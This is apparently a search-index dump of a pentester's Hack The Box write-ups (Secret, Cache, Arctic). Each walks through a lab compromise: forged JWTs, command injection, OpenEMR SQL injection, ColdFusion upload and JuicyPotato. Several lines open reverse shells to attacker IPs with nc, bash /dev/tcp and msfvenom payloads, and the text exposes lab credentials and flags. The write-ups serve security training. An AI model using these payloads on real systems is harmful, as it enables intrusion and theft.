67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78\nAuthor: dasithsv &lt;dasithsv@gmail.com&gt;\nDate:   Fri Sep 3 11:30:17 2021 +0530\n\n    removed .env for security reasons\n\ndiff --git a/.env b/.env\nindex fb6f587..31db370 100644\n--- a/.env\n+++ b/.env\n@@ -1,2 +1,2 @@\n DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'\n-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\n+TOKEN_SECRET = secret\nGo to JWT.io and paste our created token. In the bottom right corner paste the found token signature (extracted from git) and we’ll see Signature Verified.\n![[Pasted image 20211112141140.png]]\nWith a verified signature, we can change our username from player3 to theadmin. Take the new auth token and verify that you’re now an admin.\n┌──(void㉿void)-[/htb/secret/files/local-web/.git]\n└─$ curl -X GET http://10.10.11.120:3000/api/priv -H \"Content-Type: application/json\" -H \"Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBsYXllcjNAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzE4ODczfQ.mHuzptCZxArx8xTaM4Hu0ijriDdlY5BA5dPURWjA6Rk\"\n{\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}}\n\n\n\nStep 3\nNext we need to figure out how to exploit the use of the admin token. Looking in routes/private.js we find something interesting. If we are user theadmin, requests will be executed using exec - meaning the app is vulnerable to command injection/execution.\n$ cat routes/private.js \n\n[... snip ...]\n\nrouter.get('/logs', verifytoken, (req, res) =&gt; {\n    const file = req.query.file;\n    const userinfo = { name: req.user }\n    const name = userinfo.name.name;\n    \n    if (name == 'theadmin'){\n        const getLogs = `git log --oneline ${file}`;\n        exec(getLogs, (err , output) =&gt;{\n            if(err){\n                res.status(500).send(err);\n                return\n            }\n            res.json(output);\n        })\n    }\n    else{\n        res.json({\n            role: {\n                role: \"you are normal user\",\n                desc: userinfo.name.name\n            }\n        })\n    }\n})\nCode Execution:\n$ curl -X GET -H \"Content-Type: application/json\" -H \"Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBsYXllcjNAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzE4ODczfQ.mHuzptCZxArx8xTaM4Hu0ijriDdlY5BA5dPURWjA6Rk\" \"http://secret.htb/api/logs?file=|id\"   \n\"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\" \nCreate a reverse shell with “nc mkfifo”:\n$ curl -X GET -H \"Content-Type: application/json\" -H \"Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBsYXllcjNAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzE4ODczfQ.mHuzptCZxArx8xTaM4Hu0ijriDdlY5BA5dPURWjA6Rk\" \"http://secret.htb/api/logs?file=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.3+4488+&gt;/tmp/f\"\n\n$ nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.10.11.120] 60328\n/bin/sh: 0: can't access tty; job control turned off\n$ id && hostname\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\nsecret\n$ cat user.txt  \na9fd4876fae583bb8625a466208d711f\n\n\n\n\nROOT\n\nStep 1\nDoing a quick manual enumeration with sudo -l and looking through some standard directories we find /opt/count with the SUID bit set.\n$ ls -al\ntotal 56\ndrwxr-xr-x  2 root root  4096 Oct  7 10:06 .\ndrwxr-xr-x 20 root root  4096 Oct  7 15:01 ..\n-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c\n-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp\n-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count\n-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log\nPlaying around with the application, count, we can read /root/root.txt and when asked to save the count-data to a file we just stop and wait. In theory the data should now be stored in memory and if we some how can crash the application maybe we could be able to retreive it.\ndasith@secret:/opt$ ./count \nEnter source file/directory name: /root/root.txt\n\nTotal characters = 33\nTotal words      = 2\nTotal lines      = 2\nSave results a file? [y/N]: \nFrom a second terminal, force a core dump with kill -11 (SEGV):\ndasith@secret:/opt$ ps aux | grep count\nroot         779  0.0  0.1 235672  7464 ?        Ssl  09:04   0:00 /usr/lib/accountsservice/accounts-daemon\ndasith      3001  0.0  0.0   2488   588 pts/1    S+   13:14   0:00 ./count\ndasith      3004  0.0  0.0   6432   736 pts/0    S+   13:15   0:00 grep --color=auto count\ndasith@secret:/opt$ kill -11 3001\ndasith@secret:/opt$ ./count \nEnter source file/directory name: /root/root.txt\n\nTotal characters = 33\nTotal words      = 2\nTotal lines      = 2\nSave results a file? [y/N]: Segmentation fault (core dumped)\ndasith@secret:/opt$ ls -al /var/crash/\ntotal 88\ndrwxrwxrwt  2 root   root    4096 Nov 22 13:15 .\ndrwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..\n-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash\n-rw-r-----  1 dasith dasith 28049 Nov 22 13:15 _opt_count.1000.crash\n-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash\nRead the CoreDump and grab the flag.\ndasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /dev/shm/crash\ndasith@secret:/var/crash$ cd /dev/shm/crash/\ndasith@secret:/dev/shm/crash$ strings CoreDump\n\n[... snip ...]\n\n/root/root.txt\n775db4f3cd0ca47cfb448e1bd5f4dced\n\n\n\n\nReferences\nkill / core dump: https://www.techonthenet.com/linux/commands/kill.php https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd"
  },
  {
    "objectID": "posts/2020-06-05-htb-writeup-cache/2020-06-05-htb-writeup-cache.html",
    "href": "posts/2020-06-05-htb-writeup-cache/2020-06-05-htb-writeup-cache.html",
    "title": "Cache - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb/cache# nmap -Pn -sC -sV -n 10.10.10.188 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA) | 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA) |_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Cache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.188/index.html (CODE:200|SIZE:8193)\nhttp://10.10.10.188/javascript/jquery/jquery (CODE:200|SIZE:268026)\n\nNIKTO:\n\n/login.html: Admin login page/section found.\n\nVisiting the site and looking around gives us a hostname on the ‘author.html’-page, cache.htb. We also find the name of the of the author, Ash, as well as the name of his other project - HMS. A login page is obvious, trying SQLi seems to be useless. Looking through the source we can see that the form links to ‘net.html’. Visiting net.html flashes a picture and then returns us to the login page.\nWe can confirm that user ‘ash’ is correct, as it only gives us an error for the password.\nFurther enumeration in the js-files we find something. The file funtionality.js contains the following function: function checkCorrectPassword(){ var Password = $(“#password”).val(); if(Password != ‘H@v3_fun’){ alert(“Password didn’t Match”); error_correctPassword = true;\nWe are now able to login using creds ash:H@v3_fun, however it only says “Welcome Back!” along with a picture of a anime cowboy and the text “This page is still underconstruction”. Possible rabbit hole?\nAdding hms.htb in our hosts-file gives us access to OpenEMR.\nAdmin Login: http://hms.htb/interface/login/login.php?site=default\nCustomer Portal: http://hms.htb/portal/\nReading about OpenEMR we find that there are a authentication bypass vulnerability, allowing an unauthenticated user to view patient records - to add a cherry on top, the patient records are also vulnerable to SQLi.\nBrowse to the customer portal, press ‘Register’ to grab a authenticated cookie, and then start to view authenticated pages as you please. To execute the SQLi start your proxy, and catch your GET request to:\nhttp://hms.htb/portal/add_edit_event_user.php?eid=1’\nCopy the request and paste it into a file, and remove the’ (url-encoded to %27) Fire up SQLmap and attack!\nroot@nidus:/git/htb/cache# cat openemr.req GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1 Host: hms.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: OpenEMR=rn8u2gc83jdnfb64codf22edvd; PHPSESSID=h9anmkcdmjgcshjdns6jhictuc Upgrade-Insecure-Requests: 1\nroot@nidus:/git/htb/cache# sqlmap -r openemr.req –threads=10 –dbs .. [12:16:59] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.1 .. available databases [2]: [*] information_schema [*] openemr\nContinue to enumerate tables to user information. root@nidus:/git/htb/cache# sqlmap -r openemr.req –threads=10 -D openemr –tables .. [12:21:32] [INFO] retrieved: ‘users’ [12:21:32] [INFO] retrieved: ‘users_secure’ ..\n\nView the columns in users_secure. root@nidus:/git/htb/cache# sqlmap -r openemr.req –threads=10 -D openemr -T users_secure –dump Database: openemr Table: users_secure [1 entry] +——+——————————–+—————+————————————————————–+———————+—————+—————+——————-+——————-+ | id | salt | username | password | last_update | salt_history1 | salt_history2 | password_history1 | password_history2 | +——+——————————–+—————+————————————————————–+———————+—————+—————+——————-+——————-+ | 1 | $2a\\(05\\)l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a\\(05\\)l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL | NULL | NULL | NULL | +——+——————————–+—————+————————————————————–+———————+—————+—————+——————-+——————-+\n\nCrack the found password hash, using hashcat.\nroot@nidus:/git/htb/cache# cat hash.txt $2a\\(05\\)l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.\nroot@nidus:/git/htb/cache# hashcat -a0 -m3200 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt .. Status………..: Cracked\nroot@nidus:/git/htb/cache# cat cracked.txt $2a\\(05\\)l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx\nLogin with the cracked credentials - openemr_admin:xxxxxx\nWhen authenticated, there are several exploits. One interesting is a RCE, giving us a reverse shell. https://www.exploit-db.com/exploits/45161 Download the script, setup your listener and execute.\nroot@nidus:/git/htb/cache# python openemr_rce.py http://hms.htb/ -u openemr_admin -p xxxxxx -c ‘bash -i &gt;& /dev/tcp/10.10.14.17/4488 0&gt;&1’ root@nidus:~# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.17] from (UNKNOWN) [10.10.10.188] 36004 bash: cannot set terminal process group (1251): Inappropriate ioctl for device bash: no job control in this shell\nwww-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami www-data\nRun linpeas and we find some local running services, 3306 (MySQL) and 11211 (Memcached). Memcached is not well known, so I decide to start there. Googling for “Memcached Priv Esc” I found a writeup for the old HTB box Dab, and within they extract data from Memcached slabs.\nProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name .. tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN -\nAccess Memcached through a local Telnet session.   stats cachedump 1 1000 ITEM link [21 b; 0 s] ITEM user [5 b; 0 s] ITEM passwd [9 b; 0 s] ITEM file [7 b; 0 s] ITEM account [9 b; 0 s] END\nUser and Passwd looks promising, so we dump thoese. Syntax: get  get user VALUE user 0 5 luffy END\nget passwd VALUE passwd 0 9 0n3_p1ec3 END\nget account VALUE account 0 9 afhj556uo END\nThe credentials, luffy:0n3_p1ec3, can be used to access the box through SSH. Maybe some of the passwords we’ve found throughout this journey can be used for user Ash, so I decided to try changing user.\nluffy@cache:/dev/shm$ id uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) luffy@cache:/dev/shm$ su ash Password: H@v3_fun ash@cache:/dev/shm$ whoami ash ash@cache:/dev/shm$ cat /home/ash/user.txt 6d6c7f30cc8a6f30d6064c93626c0ad2\nNOTE VERIFIED CREDS: ash:H@v3_fun luffy:0n3_p1ec3 openemr_admin:xxxxxx\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating the box as user ash gives is nothing really to go on. So instead I went back to luffy to investigate, especially the group 999(docker) which I’ve never seen before. Googling about docker groups tells us there are an easy exploit where we can mount a folder/file to a container and/or image.\nLooking at our box we don’t have any containers, however we do have the ubuntu image which we can use for our exploit.\nluffy@cache:/dev/shm$ docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\nluffy@cache:/dev/shm$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 2ca708c1c9cc 8 months ago 64.2MB\nNext, we mount the directory /root to our docker image /mnt directory, to extract root.txt and in a real life scenario SSH-keys.\nluffy@cache:/dev/shm$ docker run –help .. -i, –interactive Keep STDIN open even if not attached -t, –tty Allocate a pseudo-TTY -v, –volume list Bind mount a volume\nluffy@cache:/dev/shm$ docker run -v /root:/mnt -it ubuntu root@30194c706a68:/# id uid=0(root) gid=0(root) groups=0(root) root@30194c706a68:/# cd /mnt/ root@30194c706a68:/mnt# ls -al .. -rw——- 1 root root 33 Jun 5 07:27 root.txt root@30194c706a68:/mnt# cat root.txt ca89fe2e56238df32bac7edc90488959\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nOpenEMR: https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf https://www.databreaches.net/openemr-patches-serious-vulnerabilities-uncovered-by-project-insecurity/ https://www.exploit-db.com/exploits/45161\nMemcached: https://medium.com/@noobintheshell/htb-dab-writeup-6459329737d0\nDocker privesc: https://www.hackingarticles.in/docker-privilege-escalation/"
  },
  {
    "objectID": "posts/2021-02-26-htb-writeup-arctic/2021-02-26-htb-writeup-arctic.html",
    "href": "posts/2021-02-26-htb-writeup-arctic/2021-02-26-htb-writeup-arctic.html",
    "title": "Arctic - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:~]# nmap -Pn -n -sCV 10.10.10.11 –open PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nRPCCLIENT: -U “” = timeout\n\nThe port 8500 is unknown to me, so googling about it and I found a TCP port list, showing exploits from Shadowbrokers. Port 8500 is assigned for ‘ColdFusion Macromedia/Adobe ColdFusion default Webserver port’.\nContinue to google about ColdFusion exploits and I find a python upload script, made by Arrexel from HTB.\n[root:/git/htb/arctic]# python coldFusion.py 10.10.10.11 8500 cmd.jsp (master✱) Sending payload… Successfully uploaded payload! Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp\nCommand: whoami arctic\n\nThe webshell is to unstable, so instead create a reverse payload to create a reverse shell. [root:/git/htb/arctic]# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=4488 -f raw &gt; payload.jsp (master✱) Payload size: 1496 bytes\n[root:/git/htb/arctic]# python coldFusion.py 10.10.10.11 8500 payload.jsp                                                         (master✱)\n  Sending payload...\n  Successfully uploaded payload!\n  Find it at http://10.10.10.11:8500/userfiles/file/payload.jsp\n\n[root:/git/htb/arctic]# rlwrap nc -lvnp 4488                                                                                      (master✱)\n  listening on [any] 4488 ...\n  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49214\n  Microsoft Windows [Version 6.1.7600]\n  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n  C:\\ColdFusion8\\runtime\\bin&gt; whoami\n    arctic\\tolis\n\n  C:\\Users\\tolis\\Desktop&gt; type user.txt\n    02650d3a69a70780c302e146a6cb96f3\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nCheck privs to see if we can abuse them.\n\nC:&gt; whoami /priv\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= ========\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\nWe got ‘SeImpersonatePrivilege’, and since it’s a 2008 machine JuicyPotato is allways an option.\nStart by creating your reverse payload: [root:/srv/pub-share]# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 &gt; arctic-privesc.bat [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 1583 bytes\nSetup a SMB Server and copy JuicyPotato and .bat-file to the victim: [root:/srv/pub-share]# smbserver.py share .\nC:\\tmp&gt; copy \\\\10.10.14.8\\share\\JuicyPotato.exe .\n        1 file(s) copied\nC:\\tmp&gt; copy \\\\10.10.14.8\\share\\arctic-privesc.bat .\n        1 file(s) copied.\nExecute the exploit: C:&gt; JuicyPotato.exe -l 1444 -p c:.exe -a “/c C:-privesc.bat” -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820} Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1444 …. [+] authresult 0 {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\n  [+] CreateProcessWithTokenW OK\n\n\n[root:/git/htb/arctic]# rlwrap nc -lvnp 4499                                                                                      (master✱)\n  listening on [any] 4499 ...\n  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49269\n  Microsoft Windows [Version 6.1.7600]\n  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n  C:\\Windows/System32&gt; whoami\n    nt authority\\system\n\n  C:\\Users\\Administrator\\Desktop&gt; type root.txt\n    ce65ceee66b2b5ebaff07e50508ffb90\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nShadowbrokers port list: https://github.com/DonnchaC/shadowbrokers-exploits/blob/master/windows/Resources/Ep/Scripts/tcp_ports.txt\nColdFusion file upload: https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload"
  },
  {
    "objectID": "about.html",
    "href": "about.html",
    "title": "0xPThree",
    "section": "",
    "text": "Pentester with a background as Network Architect. Specialized in hacking UNIX-like devices, with a passion for routers, NAS devices and everything IOT really. Hit me up on Signal or join my (empty) Discord channel if you need anything.\n✅ 2022-09-16: Rank 1, Sweden, @HackTheBox"
  }
]